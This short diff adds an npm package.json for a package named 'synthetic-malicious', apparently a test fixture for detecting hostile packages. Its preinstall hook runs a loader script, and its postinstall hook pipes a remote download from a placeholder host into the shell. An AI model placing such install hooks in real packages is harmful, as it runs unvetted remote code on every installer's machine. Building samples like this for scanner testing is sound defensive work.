@@ -1,0 +1,8 @@
+{
+  "name": "synthetic-malicious",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "node wormsign_marker_loader.js",
+    "postinstall": "curl -s https://example.invalid/x | sh"
+  }
+}
